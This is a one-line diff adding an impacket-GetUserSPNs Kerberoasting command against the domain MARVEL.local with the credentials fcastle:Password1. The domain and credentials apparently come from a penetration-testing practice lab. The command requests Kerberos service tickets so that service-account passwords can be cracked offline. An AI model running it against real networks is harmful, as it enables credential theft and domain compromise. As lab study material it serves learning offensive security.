@@ -1,0 +1,1 @@
+impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip <dc-ip> -request
